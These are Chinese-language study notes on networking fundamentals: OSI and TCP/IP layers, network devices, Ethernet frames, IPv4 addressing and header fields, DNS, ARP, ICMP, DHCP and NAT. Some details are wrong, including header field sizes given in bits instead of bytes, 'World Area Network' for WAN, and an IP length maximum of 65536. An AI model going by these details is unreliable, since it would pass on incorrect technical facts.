

# 基本网络概念🔆

## 网络基础

TCP/IP 是通信协议的统称

计算机网络，根据规模可以分为：

- WAN：广域网（ World Area Network ）

- LAN：局域网（ Local Area Network ）



## 协议

协议，就是计算机与计算机之间通过网络通信时事先达成的一种 “约定” ，这种 “约定” 使不同厂商、不同操作系统的设备只要遵循相同的协议就可以实现通信。





## 传输方式

通过网络发送数据，可以分为两种方式：

- 面向有连接型：发送数据之前，需要在主机之间连接一条通信线路

- 面向无连接型：不要求建立和断开连接，发送端可以在任何时候发送，接收端也可以在任意时候接收



网络通信的方式也可以分为两种：

- 电路交换：

  主要用于过去的电话网。在电路交换中，交换机负责数据的中转处理，计算机发送数据时，需要通过交换机与目标计算机建立通信电路，建立好连接之后，用户可以一直使用这条通路进行通信。

  但是如果一条通路上连接了多台计算机，由于一台计算机收发消息时会独占线路，所以其他计算机只能等到这台计算机处理结束后才有机会使用这条线路。

  

<img src="http://store.secretcamp.cn/uPic/image-20210204193509263202102041935091612438509PKlLNiPKlLNi.png" alt="image-20210204193509263" style="zoom:50%;" />

- 分组交换：

  分组交换是指将通信电路中的计算机发送的数据拆分成数据包，按照一定的顺序排列之后分别发送。

  大致的处理过程是：计算机将数据包发送给路由器，路由器收到分组数据后缓存到自己的缓冲区，然后再转发给目标计算机。计算机与路由器、路由器与路由器之间通常只有一条通信线路，但这是一条共享线路。

<img src="http://store.secretcamp.cn/uPic/image-20210204193520939202102041935211612438521EmGX1JEmGX1J.png" alt="image-20210204193520939" style="zoom:50%;" />





## 地址

MAC 地址：设备的物理地址，不具有层次性

IP 地址：互联网协议地址，具有层次性

网络寻址中，每个节点会根据分组数据的地址信息来判断应该发送到哪个节点，MAC寻址中参考的是「地址转发表」，IP寻址参考的则是「路由控制表」

<img src="http://store.secretcamp.cn/uPic/image-20210204194624552202102041946241612439184b4Vmbtb4Vmbt.png" alt="image-20210204194624552" style="zoom: 50%;" />



## 网络的构成要素

<img src="http://store.secretcamp.cn/uPic/image-20210204194718408202102041947181612439238MFL5jZMFL5jZ.png" alt="image-20210204194718408" style="zoom:50%;" />











### 调制解调器（物理层）

调制解调器又叫数模转换器，它将计算机的数字信号变成模拟信号然后在光纤中传输的过程叫 “调制” ，反过来将光纤中的模拟信号变成计算机认识的数字信号叫 “解调” ，完成两台计算机之间的通信。





### 中继器（物理层）

中继器是在物理层面上延长网络的设备，由光缆传递的光电信号通过中继器，进行波形调整和放大

中继器是模拟设备，用于连接两根电缆段。中继器不理解帧、分组和头的概念，他们只理解电压值。

<img src="http://store.secretcamp.cn/uPic/image-20210204195344905202102041953451612439625xtl8zCxtl8zC.png" alt="image-20210204195344905" style="zoom:50%;" />



### 集线器（物理层）

集线器（Hub）是中继器的一种形式，区别在于集线器能够提供多端口服务，也称为多端口中继器。

集线器可以实现多台计算机之间的互联，因为它有很多的端口，每个端口都能连计算机。集线器把每个输入端口的信号进行放大再发到别的端口去。



### 网卡（物理层）

网卡全称网络接口卡，计算机必须有网卡才能接入网络。







### 网桥（数据链路层）

网桥又称 2 层交换机，工作在数据链路层，可以在数据链路层面上连接两个局域网  ，基本功能是接收帧、寻找通向目的地址的端口、发送帧,可以看做一个低级的路由器。

网桥能够识别数据帧，并将这些数据帧临时存储于内存，再重新生成一个全新的帧转发给附近的网段。

<img src="http://store.secretcamp.cn/uPic/image-20210204195600616202102041956001612439760zkqy0Hzkqy0H.png" alt="image-20210204195600616" style="zoom:50%;" />



### 交换机（数据链路层）

交换机可以分辨出帧中的源 MAC 地址和目的 MAC 地址，能在任意两个端口间建立联系，在数据帧的始发者和目标接收者之间建立临时的交换路径，使数据帧直接由源地址到达目的地址。

交换机比 HUB 更智能，它使用硬件来完成以往网桥使用软件来完成过滤、学习和转发过程的任务，交换机速度比 HUB 快，这是由于HUB 不知道目标地址在何处，只能发送数据到所有的端口。交换机中有一张地址转发表，如果知道目标地址在何处，就把数据发送到指定地点。

交换机可以理解为高级的网桥，他有网桥的功能，但性能比网桥强。交换机和网桥的细微差别在于：交换机常常用来连接独立的计算机，而网桥连接的目标是 LAN，所以交换机的端口较网桥多。





### 路由器（网络层）

路由器工作在网络层，它的基本功能是连接两个网络，为经过路由器的每个 IP 数据包寻找一条最佳传输路径，并将该数据有效地传送到目的站点。

网桥是根据 MAC 地址进行处理，路由器则是根据 IP 地址进行处理。







### 网关（传输层、应用层）

网关负责将传输层到应用层的数据进行转换和转发，它与4~7层交换机都是处理传出层以上的数据，但是网关有一个特殊的功能，它可以在两个不能直接通信的协议之间进行翻译，最终实现两者的通信。

在局域网中集线器就是网关，在 2 层网络中，交换机就是网关，在 3 层网络里，路由器就是网关。

<img src="http://store.secretcamp.cn/uPic/image-20210204200508064202102042005081612440308cStfCCcStfCC.png" alt="image-20210204200508064" style="zoom: 50%;" />





# 基本网络模型🔆

## OSI参考模型

OSI 模型全称为开放式通信系统互连参考模型

OSI 参考模型将通信协议中必要的功能分为 7 层，每一分层都为上一层提供服务，并接收下一层提供的服务。

上下层进行交互所遵循的预定叫做 “接口” ，同一层之间交互所遵循的协议叫做 “协议” 。

<img src="http://store.secretcamp.cn/uPic/%E6%8E%A5%E5%8F%A3%E4%B8%8E%E5%8D%8F%E8%AE%AE202102041602401612425760x4Msj2x4Msj2.png" style="zoom:60%;" />



- 物理层：负责 [0,1] 比特流与高低电压之间的转换 
- 数据链路层：负责物理层面上互联的节点之间的通信传输
- 网络层：将数据传输到目标地址的过程中，网络层主要负责寻址和路由
- 传输层：在两个主机之间创建逻辑上的通信连接
- 会话层：负责建立、管理和断开通信连接，决定采用何种连接方法
- 表示层：负责格式转换，将应用处理的信息转换为适合网络传输的格式，使通信的应用程序能够解释交换数据的含义
- 应用层：作用是通过应用程序间的交互来完成特定的网络应用。

<img src="http://store.secretcamp.cn/uPic/image-20210204190938801202102041909381612436978nS5EvFnS5EvF.png" alt="image-20210204190938801" style="zoom:50%;" />





## TCP/IP协议分层模型

OSI 七层模型在提出时的出发点是基于标准化的考虑，而没有考虑到具体的市场需求，使得该模型结构复杂，而 TCP/IP 参考模型直接面向市场需求，实现起来也比较容易。

TCP/IP 的分层模型和 OSI 参考模型有一定的区别，但其实也能对应到 OSI 参考模型中。

<img src="http://store.secretcamp.cn/uPic/TCPIPmodel2021020420093116124405712IGZfn2IGZfn.png" style="zoom: 50%;" />

- 物理层：对应 OSI 参考模型的物理层
- 数据链路层：对应 OSI 参考模型的数据链路层
- 网络层：对应 OSI 参考模型的网络层，主要负责相同或不同网络中计算机之间的通信
- 传输层：对应于 OSI 参考模型的传输层，为上层实体提供源端到对端主机的通信功能
- 应用层：包含了 OSI 参考模型中的会话层、表示层和应用层

> 物理层和数据链路层在TCP/IP模型中可以统称为网络接入层，它负责监视数据在主机和网络之间的交换。事实上，TCP/IP 并未真正描述这一层的实现，而由参与互连的各网络使用自己的物理层和数据链路层协议，然后与TCP/IP的网络接入层进行连接，因此具体的实现方法将随着网络类型的不同而有所差异。



为什么 TCP/IP 分层模型要去除表示层和会话层？

OSI 参考模型在提出时，他们的理想是非常好的，但实际上，由于会话层、表示层、应用层都是在应用程序内部实现的，最终产出的是一个应用数据包，而应用程序之间是几乎无法实现代码的抽象共享的，这也就造成 OSI 设想中的应用程序维度的分层是无法实现的。



## 分层模型中的通讯

### 数据包首部

`数据包 = 协议所要用到的首部 + 上层传来的数据`

每个分层中，都会对所发送的数据附加一个首部，在这个首部中包含了该层必要的信息，如发送的目标地址以及协议相关信息，明确的标明了应该如何读取数据。通常，为协议提供的信息为包首部，所要发送的内容为数据。

在下一层的角度看，从上一分层收到的包（包括上一次的协议首部）全部都被认为是本层的数据。

<img src="http://store.secretcamp.cn/uPic/TCPIP01202102041603501612425830aOAxzSaOAxzS.png" style="zoom:67%;" />

### 发送数据包

<img src="http://store.secretcamp.cn/uPic/image-20210204203101033202102042031011612441861AM0d1yAM0d1y.png" alt="image-20210204203101033" style="zoom: 50%;" />



### 经过数据链路的包

分组数据包在流动时，从前往后依次被附加了以太网包首部、IP包首部、TCP包首部以及应用自己的包首部。

每个包首部包含两个信息：

- 发送端和接收端地址
- 上一层的协议类型

在数据链路层数据包添加以太网包首部后被封装成数据帧，在物理层数据帧被封装成比特流，之后通过传输介质传送到对端。

<img src="http://store.secretcamp.cn/uPic/image-202102042035183622021020420351816124421188iabKE8iabKE.png" alt="image-20210204203518362" style="zoom: 50%;" />









# 数据链路层🔆

## 数据链路层的概念

TCP/IP 中对于 OSI 参考模型的数据链路层、物理层未做定义，因为 TCP/IP 以这两层功能是透明的为前提。

数据链路是让互联计算机之间相互通信的一种协议和通信手段，数据链路层的主要作用是在互连同一种数据链路的节点之间进行通信。



## 相关技术

### MAC地址

MAC 地址用于识别数据链路中互连的节点，用 12 个十六进制数表示，长 48 bit。

<img src="http://store.secretcamp.cn/uPic/image-20210204210047818202102042100471612443647nWkhURnWkhUR.png" alt="image-20210204210047818" style="zoom:67%;" />



### 共享介质型网络

从通信介质的使用方法上看，网络可分为共享介质型和非共享介质型。

共享介质型网络指由多个设备共享一个通信介质的一种网络，最早的以太网和 FDDI 就是介质共享型网络。在这种方式下，设备之间使用同一个载波信道进行发送的接收。

共享介质型网络中有两种介质访问控制方式：

- 争用方式

  争用方式中各个站采用先到先得的方式占用信道，如果多个站同时发送数据帧，则会产生拥堵。

  <img src="http://store.secretcamp.cn/uPic/image-20210204210349388202102042103491612443829zHFxjezHFxje.png" alt="image-20210204210349388" style="zoom:50%;" />

- 令牌传递方式

  令牌传递方式是沿着令牌环发送一种叫做 “令牌” 的特殊报文，只有获得令牌的站オ能发送数据。

  这种方式有两个特点：

  - 每个站机会均等
  - 即使网络拥堵也不会性能下降

  但是在网络空闲时数据链路的利用率达不到 100 %



### 非共享介质型网络👉

非共享介质网络是指不共享介质，是对介质采取专用的一种传输控制方式。在这种方式下，网络中的每个站直连交换机，由交换机负责转发数据帧。此方式下，发送端与接收端并不共享通信介质，因此很多情况下采用全双工通信方式。

> 半双工：只发送或者只接收的通讯模式；全双工：同一时间既可以发送数据也可以接收数据

<img src="http://store.secretcamp.cn/uPic/image-20210204211328312202102042113281612444408D0sp1fD0sp1f.png" alt="image-20210204211328312" style="zoom: 50%;" />



### 地址转发表

交换机是持有多个端口的网桥，它们根据数据链路层中每个帧的目标 MAC 地址，决定从哪个网络接口发送数据。这时所参考的、用以记录发送接口的表就叫做「地址转发表」。

<img src="http://store.secretcamp.cn/uPic/image-20210204212135395202102042121351612444895SF0g57SF0g57.png" alt="image-20210204212135395" style="zoom:50%;" />





### 泛洪

泛洪是一种交换机常用的转发方式，当交换机要给一个目的主机发送数据帧，而数据帧中的目的 MAC 地址不在交换机 MAC 地址转发表中，则向除了接收端口以外的所有其他端口转发，这个动作就是泛洪。



## 以太网

以太网是规范较为简单、使用最为广泛的数据链路。



### 以太网帧的格式

以太网帧前端是前导码，它由 0、1 数字交替组合而成，表示一个以太网帧的开始，也是对端网卡能够确保与其同步的标志。

<img src="http://store.secretcamp.cn/uPic/image-202102042125143372021020421251416124451143M0H473M0H47.png" alt="image-20210204212514337" style="zoom: 60%;" />



以太网帧本体的前端是以太网的首部，它总共占14个字节。

- 目标 MAC 地址（6bit）

- 源 MAC 地址（6bit）

- 上层协议类型（2bit）

  > IPv4：0800  IPv6：86DD  ARP：0806

<img src="http://store.secretcamp.cn/uPic/image-20210204212732689202102042127321612445252cjW8skcjW8sk.png" alt="image-20210204212732689" style="zoom: 67%;" />

紧随帧头后面的是数据，一个数据帧所能容纳的最大数据范围是46~1500个字节。

帧尾是一个叫做 FCS (Frame Check Sequence，帧检验序列）的 4 个字节。



## 其他数据链路

- ATM
- POS
- FDDI
- HDMI

<img src="http://store.secretcamp.cn/uPic/image-20210204214054504202102042140541612446054pKGgnwpKGgnw.png" alt="image-20210204214054504" style="zoom:50%;" />





# 网络层协议🔆

## 网络层的概念

网络层的主要作用是在终端节点之间进行通信，即点对点通信。

网络层可以跨越不同的数据链路

<img src="http://store.secretcamp.cn/uPic/image-20210204215235560202102042152351612446755nJKS9KnJKS9K.png" alt="image-20210204215235560" style="zoom:50%;" />

## IP协议

### IP协议的概念

IP 协议（Internet Protocol）又称互联网协议，是支持网间互联的数据包协议。该协议工作在网络层，主要目的就是为了提高网络的可扩展性。

IP大致分为两大作用模块：IP寻址和路由、IP分包与组包

IP地址是属于网络层的地址，网络层的主要作用是实现终端节点之间的通信，数据链路层则是对同一数据链路下的互联节点之间实现包传递。

IP属于面向无连接型，目的是为了简单和高速化，但可靠性较低，于是上一层的TCP协议的目的就是为了提高可靠性。



### IP寻址和路由

在 IP 数据包中会携带源 IP 地址和目的 IP 地址来标识该数据包的源主机和目的主机。IP 数据报在传输过程中，每个中间节点（IP 网关、路由器）只根据网络地址进行转发，如果中间节点是路由器，则路由器会根据「路由控制表」选择合适的路径。IP 协议根据路由选择协议提供的路由信息对 IP 数据报进行转发，直至抵达目的主机。

<img src="http://store.secretcamp.cn/uPic/IP01202102042154211612446861snXSSEsnXSSE.png" style="zoom: 67%;" />

路由控制表：所有的主机都维护一张路由控制表，该表记录 IP 数据在下一步应该发给哪个路由器。

<img src="http://store.secretcamp.cn/uPic/image-20210206102700120202102061027001612578420yT0KzIyT0KzI.png" alt="image-20210206102700120" style="zoom:50%;" />



路由控制是指将分组数据发送到最终目标地址的功能。

Hop 的含义是 “跳” ，它指网络中的一个区间，IP 包正式在网络中的一个个跳间中被转发，因为 IP 路由也叫多跳路由，在每一个区间内决定包在下一跳被转发的路径。

- 一跳：利用数据链路层以下分层的功能传输数据帧的一个区间，是不经过路由器能到达下一主机或路由器的一个区间。
- 多跳：转发 IP 数据包时只指定下一个路由器或主机。每一个区间在转发 IP 数据包时，会指定下一跳的路径，直至包到达最终目标地址。



### IP分片与重组

IP 是实现多个数据链路之间通信的协议，IP 数据包在传输过程中可能会经过不同的网络，在不同的网络中数据包的最大长度限制是不同的，IP 协议通过给每个 IP 数据包分配一个标识符以及分段与组装的相关信息，使得数据包在不同的网络中能够传输，被分段后的 IP 数据报可以独立地在网络中进行转发。

对于 IP 的上一层，数据链路的地址会被抽象成 IP 地址，不同数据链路的 MTU（最大传输单位）不同，IP 的上一层（传输层）传输的数据有时会大于 MTU，于是 IP 就会对其进行分片处理。

> 对于以太网而言，MTU的值为 1500 字节

<img src="http://store.secretcamp.cn/uPic/IP03202102061015151612577715rs9txdrs9txd.png" style="zoom:67%;" />



经过分片之后的 IP 数据报只能由目标主机进行重组，路由器可以对 IP 进行分片，但不能进行重组，在到达目的主机后由目的主机完成重组工作，恢复出原来的 IP 数据包。





分片机制的缺点：

- 路由器需要进行分片操作，负荷加重
- 如果丢失了其中一个分片，那么整个数据包都会作废

「路径 MTU 发现」技术在一定程度上可以弥补上述的缺点。

路径 MTU 发现： 路径 MTU 是从发射端到接收端所经过的所有数据链路中不需要分片的最大 MTU，如果进行分片的值小于路径 MTU，那么路由器就不必对数据包进行分片，从而减小路由器的负荷。



<img src="http://store.secretcamp.cn/uPic/image-20210208202352751202102082023521612787032dshemidshemi.png" alt="image-20210208202352751" style="zoom:50%;" />



### IP地址（32bit）

#### IP地址的定义

IP地址采用 32 个二进制数表示，每 8 位为一组，也可以表示为 4 个十进制数。

<img src="http://store.secretcamp.cn/uPic/IPaddr01202102071011261612663886fzljV2fzljV2.png" style="zoom:50%;" />

IP 地址最多有 2<sup>32 </sup>= 4294967296 个，

每个 IP 地址都由「网络标识」和「主机标识」组成。

<img src="http://store.secretcamp.cn/uPic/IPaddr022021020710115416126639148oKwSp8oKwSp.png" style="zoom:75%;" />

<img src="http://store.secretcamp.cn/uPic/IPaddr03202102071012041612663924GhOlhgGhOlhg.png" style="zoom:50%;" />



#### IP地址的分类

分配 IP 地址时，主机标识不可全为 0 或者全为 1，因为这代表了特殊含义。

全为 0 表示对应网络地址或 IP 地址不可获知；

全为 1 表示主机地址作为广播地址。



##### A类地址

以 “0” 开头，1~8位网络标识，可容纳的主机地址最多 2<sup>24</sup>-2=16777214个（2<sup>24</sup>-2表示不包括全为 0 和全为 1 的地址，下同），即 ` 0.0.0.0 - 127.0.0.0`，A类地址最多有2<sup>7</sup> = 128 个

<img src="http://store.secretcamp.cn/uPic/IPaddr04A202102071019041612664344gj27bYgj27bY.png" style="zoom:50%;" />



##### B类地址

B类地址以 “10” 开头，1~16位为网络标识，可容纳的主机地址最多 2<sup>16</sup>-2=65534 个，即 `128.0.0.0 - 191.255.0.0`

B 类地址最多有2<sup>14</sup> = 16384 个

<img src="http://store.secretcamp.cn/uPic/IPaddr04B20210207102647161266480704Z9js04Z9js.png" style="zoom:50%;" />



##### C类地址

C 类地址以 “110” 开头，1~24位为网络标识，可容纳的主机地址最多2<sup>8</sup>- 2 = 254 个，即 `192.0.0.0 - 223.255.255.0`

C 类地址最多有2<sup>21</sup> = 2097152 个

<img src="http://store.secretcamp.cn/uPic/IPaddr04C202102071027101612664830TcjlNVTcjlNV.png" style="zoom:50%;" />



##### D类地址

D类地址以 “1110” 开头，1~32位为网络标识，没有主机地址，常被用于多播

D 类地址最多有2<sup>28</sup> = 268435456 个

<img src="http://store.secretcamp.cn/uPic/IPaddr04D202102071027281612664848uzmQ3YuzmQ3Y.png" style="zoom:50%;" />



#### 广播地址

广播地址用于在同一个数据链路中相互连接的主机之间发送数据包，将主机地址全部设置为 1 即为广播地址，例如将 `172.20.0.0/16` 的二进制表示为 `10101100.00010100.00000000.00000000`，将主机地址部分全部改为 1 则形成广播地址 `10101100.00010100.11111111.11111111` ，十进制表示为`172.20.255.255`



##### 本地广播

在本网络内的广播叫做本地广播。例如网络地址为 `192.168.0.0/24` ，广播地址是 `192.168.0.255` 。因为这个广播地址的 IP 包会被路由器屏蔽，所以不会到达 `192.168.0.0/24` 以外的其他链路上。



##### 直接广播

在不同网络之间的广播叫做直接广播。例如网络地址为 `192.168.0.0/24` 的主机向 `192.168.1.255/24` 的目标地址发送IP包。收到这个包的路由器，将数据转发给 `192.168.1.0/24` ，从而使得所有 `192.168.1.1 ~ 192.168.1.254` 的主机都能收到这个包。



##### IP多播

多播用于将包发送给特定组内的所有主机。



#### 子网掩码

子网掩码通过子网网络地址细分出比 A、B、C 类地址更小粒度的网络。在实际使用中，直接使用 A、B、C 类地址可能会造成浪费，因为一个链路内的计算机数量并不充足，所以需要子网掩码将网络地址细分。

子网掩码是一个 32 位地址，用于屏蔽 IP 地址的一部分以区别网络标识和主机标识。

子网掩码的左边是网络位，用二进制数字 1 表示，1 的数目等于网络位的长度；右边是主机位，用二进制数字 0 表示，0 的数目等于主机位的长度。



不是某个 IP 的网络号和主机号决定子网掩码是什么，而是子网掩码决定了某个 IP 地址的网络号与主机号是什么，IP 地址是要搭配子网掩码使用的。

有时候一个网络中并没有太多的主机，通过子网掩码的作用，B 类地址的网络标识被扩展，从16位扩展到了 26 位，主机标识从 16 位减少到 6 位，这样的一个网络最多可以容纳 2<sup>6</sup> - 2 = 62 个主机，不会浪费。



<img src="http://store.secretcamp.cn/uPic/image-20210207105042100202102071050421612666242axdekpaxdekp.png" alt="image-20210207105042100" style="zoom: 50%;" />



#### 全局地址和私有地址

起初，互联网中的任何一台主机或路由器都有唯一的 IP 地址，一旦出现 IP 冲突就无法区分数据应该发送给哪个 IP 地址。

对于没有连接互联网的独立网络中的主机，主需要保证在当前网络中地址唯一，于是出现了私有地址。

`10.0.0.0 ~ 10.255.255.255`

`172.16.0.0 ~ 172.31.255.255`

`192.168.0.0 ~ 192.168.255.255`

包含在这三种 IP 范围都属于私有 IP，在此之外的 IP 地址属于全局 IP，随着 NAT 技术的出现，私有 IP 地址的主机也可以接入互联网了。



### IPv4首部

IPv4首部中包含了用于IP协议进行发包控制所必要的信息

<img src="http://store.secretcamp.cn/uPic/image-20210208202636349202102082026361612787196NCuX6SNCuX6S.png" alt="image-20210208202636349" style="zoom:50%;" />

#### 版本 4bit

IPv4 在此字段的值是 “4” ，即 0100



#### 首部长度 4bit

表明IP首部的长度，单位为字节

对于没有可选项的IP包，首部长度为5，那么首部长度为 $5\times4 = 20$ 字节

4bit 最大可以表示15，那么首部长度最多为 $15\times4 = 60$ 字节



#### 区分服务 8bit

用来表明服务质量，该字段使用的较少

<img src="http://store.secretcamp.cn/uPic/image-20210208204025024202102082040251612788025U20Y3vU20Y3v.png" alt="image-20210208204025024" style="zoom: 50%;" />



#### 总长度 16bit

表示IP首部与数据部分合起来的总字节数，该字段长16bit，最多可以表示65536，所以IP的最长可以是65536字节。



#### 标识 16bit

用于分片重组，同一个分片的标识值相同，不同分片的标识值不同。



#### 标志 3bit

<img src="http://store.secretcamp.cn/uPic/image-20210208204310608202102082043101612788190gvHImGgvHImG.png" alt="image-20210208204310608" style="zoom:50%;" />



#### 片偏移 13bit

用来标识被分别的每一个分段相对于原始数据的位置



#### 生存时间 8bit

以秒为单位记录当前包在网络上应该生存的期限，没经过一个路由器，生存时间便减一，直到变成零则丢弃包。



#### 协议 8bit

指IP包所在层的上层协议编号

> TCP：6  UDP：17



#### 首部校验和 16bit

负责校验数据报的首部，不校验数据部分，确保IP数据报没有被损坏。



#### 源地址 32bit

表示发送端的IP地址



#### 目标地址 32bit

表示接收端的IP地址



#### 可选项&填充&数据





### IPv6

IPv6 的地址长度是 IPv4 的4倍，长 128 个 bit，可以用 32 个十六进制数表示

例如：`AD70:0000:0000:0000:CBAA:0000:00C1:0002` ，分为 8 组，每组为 4 个十六进制数





## DNS

### DNS的概念

DNS（ Domain Name System ）是域名解析系统，就是根据域名查出对应的 IP 地址。

DNS 使用 C/S 模型，其协议运行在 UDP 之上，使用 53 端口。

域名服务器主要有四种：

1. 根域名服务器：13个，用来管理顶级域名
2. 顶级域名服务器：`.com` 、`.org` 等
3. 次级域名服务器（可以有很多）：`cctv.com` 、`apache.org`
4. 本地域名服务器

<img src="http://store.secretcamp.cn/uPic/image-20210802121925642bIrf5X1627877966094.png" alt="image-20210802121925642" style="zoom:50%;" />



### DNS解析过程

当客户端需要域名解析时，通过本机的 DNS 客户端构造一个 DNS 请求报文，以 UDP 数据报方式发往本地域名服务器。

以访问 ` www.mail.163.com`  域名为例

1. 先查找本地 DNS 缓存，有则返回，没有则进入下一步
2. 查看本地 hosts 文件有没有相应的映射记录，有则返回，没有则进入下一步
3. 向本地 DNS 服务器（一般是网络接入服务器商）发送请求进行查询，本地 DNS 服务器收到请求后，会先查下自身的缓存记录，如果存在则直接返回，如果不存在，本地 DNS 服务器就会向 DNS 的根域名服务器发起查询请求。
4. 根域名服务器收到请求后，看到这是个 ` .com ` 的域名，返回 `.com` 域名服务器的 IP 地址
5. 本地 DNS 服务器收到回信后，根据 IP 地址向 `.com` 域名服务器发起请求
6. `.com` 顶级域名服务器接收到请求后，观察到这是 ` 163.com ` 的域名，返回 ` 163.com ` 域名服务器的 IP 地址
7. 本地 DNS 服务器接收到回信后，又向 ` mail.163.com ` 这个次级域名服务器发起请求
8. `mail.163.com ` 次级域名服务器接收到请求后，确认了是自己管理的域名，将 `www.mail.163.com` 这个域名的 IP 地址发送给了本地DNS服务器
9. 本地 DNS 服务器接收到回信后，将 IP 地址发送给请求的客户，同时记录该域名和 IP 地址，以备下次查阅

总结：

- 从 “根域名服务器” 查到 “顶级域名服务器” 的IP地址

- 从 “顶级域名服务器” 查到 “次级域名服务器” 的IP地址

- 从 “次级域名服务器” 查出 “目标主机域名” IP 地址



<img src="http://store.secretcamp.cn/uPic/image-20210302212020027202103022120201614691220JqBBFXJqBBFX.png" alt="image-20210302212020027" style="zoom:67%;" />



### CNAME

DNS 将域名解析成 IP，CNAME 则是是将域名解析成另外一个域名，CNAME 常应用于 CDN 加速。

CNAME 记录，也叫别名记录，假设 `www.xx.com` 的 IP 地址是 `1.1.1.1` ，CNAME 将 `www.yy.com` 指向了 `www.xx.com` ，那么久可以用过  `www.yy.com`  访问到  `www.xx.com`  ，再通过 DNS 访问到  `1.1.1.1` 







## ARP

### ARP的概念

ARP（Address Resolution Protocol）指地址解析协议，通过解析 IP 地址定位下一个应该接收数据分包的网络设备的 MAC 地址，是一个数据链路层协议。

在 TCP/IP 分层结构中，把 ARP 划分为网络层，因为在网络层看来，源主机与目标主机是通过 IP 地址进行识别的，而所有的数据传输又依赖网卡底层硬件，即数据链路层，那么就需要将 IP 地址转换为链路层可以识别的东西。

在以太网中使用 MAC 地址进行寻址，以标识不同的主机，那么就需要有一个协议将 IP 地址转换为 MAC 地址，由此就出现了 ARP 协议，所以 ARP 协议在网络层被应用，它是网络层与数据链路层连接的重要枢纽，每当有一个数据要发送的时候，都需要在通过 ARP 协议将 IP 地址转换成 MAC 地址。



### ARP工作机制

ARP借助「ARP请求」和「ARP响应」两种类型的包确定MAC地址。

假设主机 A 和主机 B 处于同一个数据链路，主机A的IP地址为 `172.20.1.1` ，主机B的IP地址为 `172.20.1.2` 。

主机 A 要获得主机 B 的 MAC 地址，首先通过广播发送一个「ARP请求包」，广播的包可以被同一个链路上的所有主机或路由器接收，如果 ARP 请求包中的目标 IP 地址与自己的 IP 地址相同，则将自身的 MAC 地址放入「ARP响应包」中发送给主机 A，与此同时，主机 B 也可以从「ARP响应包」中获取主机 A 的 IP 地址和 MAC 地址。

为了避免每次发送 IP 数据报都要获取 MAC 地址，ARP 协议引入了 ARP 缓存表，每台主机或路由器在维护着一个 ARP 缓存表，这个表包含 IP 地址到 MAC 地址的映射关系，表中记录了 `<IP地址，MAC地址>` 的键值对 ，称之为 ARP 表项。



### RARP

RARP是将 ARP 反过来，通过 MAC 地址获取 IP 地址的协议

一般个人电脑可以通过 DHCP 协议动态获取 IP 地址，但如果是嵌入式设备则无法通过 DHCP 协议获取，此时就要通过 RARP 协议获取 IP 地址。





## ICMP

### ICMP的概念

ICMP 协议用于在 IP 主机、路由器之间传递控制消息。

IP 协议并不提供可靠传输，如果传输过程中发生丢包，IP 协议并不能通知传输层是否丢包以及丢包的原因，所以需要 ICMP 协议来完成这样的功能。

ICMP 的主要功能为：

- 验证网络是否畅通

- 确认 IP 包是否成功到达目标地址

- 通知在发送过程中 IP 包被废弃的原因

<img src="http://store.secretcamp.cn/uPic/ICMP012021020821072416127896449FPDHV9FPDHV.png" style="zoom:67%;" />



### 主要的ICMP信息

#### 目标不可达

IP 路由器无法将 IP 包发送给目标地址时，就会发送一个 ICMP 目标不可达的包，告知发送端主机不可达的具体原因。



#### 重定向

如果路由器发现发送端主机使用了次优的路径来发送数据，那么会发送一个 ICMP 重定向的消息给主机，告知主机有更合适的陆游信息。



#### 超时消息

如果 IP 数据包的生存周期减少为零，则会发送一个 ICMP 超时的消息



#### 回送消息

数据包成功到达对端，则会发送 ICMP 回送消息



### Ping

Ping（Packet Internet Groper），即因特网包探测器，是 ICMP 在网络层的应用，主要用于测试网络连接量。

本地主机通过 UDP 协议向目的主机发送 ICMP Echo 请求报文，目的主机收到之后会发送 Echo 响应报文，Ping 会根据时间和成功响应的次数估算出数据包往返时间以及丢包率从而推断网络是否通常、运行是否正常等。

> 这里并不是说 Ping 或者 ICMP 是基于 UDP ，ICMP 是在传输层之下，和 TCP/UDP 没有归属关系



### TraceRoute

TraceRoute 是 ICMP 的另一个应用，其主要用来跟踪一个分组从源点耗费最少 TTL 到达目的地的路径。

TraceRoute 通过逐渐增大 TTL 值并重复发送数据报来实现其功能，首先，TraceRoute 会发送一个 TTL 为 1 的 IP 数据报到目的地，当路径上的第一个路由器收到这个数据报时，它将TTL的值减 1，此时 TTL = 0，所以路由器会将这个数据报丢掉，并返回一个差错报告报文，之后源主机会接着发送一个 TTL 为 2 的数据报，并重复此过程，直到数据报能够刚好到达目的主机。此时 TTL = 0，因此目的主机要向源主机发送 ICMP 终点不可达差错报告报文，之后源主机便知道了到达目的主机所经过的路由器 IP 地址以及到达每个路由器的往返时间。

> TTL：Time To Live ，该字段指定 IP 包被路由器丢弃之前允许通过的最大网段数量



## DHCP

### DHCP的概念

DHCP（Dynamic Host Configuration Protocal ）动态主机配置协议，是一个局域网的网络协议，在服务器控制的一段 IP 地址范围内，客户端登录服务器时就可以自动获得服务器分配的 IP 地址和子网掩码。



### DHCP工作机制

DHCP 分配 IP 地址主要分为两个阶段：

<img src="http://store.secretcamp.cn/uPic/image-20210208213452406202102082134521612791292kBBttZkBBttZ.png" alt="image-20210208213452406" style="zoom: 50%;" />



## NAT

### NAT的概念

NAT（ NetWork Address Translator ）即网络地址转换，它是一种把内部私有 IP 地址翻译成公有网络 IP 地址的技术。



### 工作机制

以 `10.0.0.10` 的主机与 `163.221.120.9` 的主机通讯为例，途中的 NAT 路由器将私有 IP `10.0.0.10` 转为 公有 IP `202.244.174.37` 再发送数据，反之，接收数据时也要进行这样的转换。

<img src="http://store.secretcamp.cn/uPic/image-20210208220030542202102082200301612792830HPgDKCHPgDKC.png" alt="image-20210208220030542" style="zoom:60%;" />



### NAT的实现方式

主要有三种：

- 静态转换：内部私有 IP 地址和公有 IP 地址是一对一的关系，并且不会发生改变。通过静态转换，可以实现外部网络对内部网络特定设备的访问，这种方式原理简单，但当某一公有 IP 地址被占用时，跟这个 IP 绑定的内部主机将无法访问 Internet。

- 动态转换：采用动态转换的方式时，私有 IP 地址每次转化成的公有 IP 地址是不唯一的。当私有 IP 地址被授权访问 Internet 时会被随机转换成一个合法的公有  IP 地址。当合法 IP 地址数量略少于网络内部计算机数量时，可以采用这种方式。

- 端口多路复用：该方式将外出数据包的源端口进行端口转换，通过端口多路复用的方式，实现内部网络所有主机共享一个合法的外部 IP 地址进行 Internet 访问，从而最大限度地节约 IP 地址资源。同时，该方案可以隐藏内部网络中的主机，从而有效避免来自 Internet 的攻击。



### NAPT

NAPT 则是端口多路复用的转换方式。

当私有网络中有多台主机同时要与外部进行通信时，NAPT的转换方式可以将包含端口号的私有 IP 转换成全局 IP

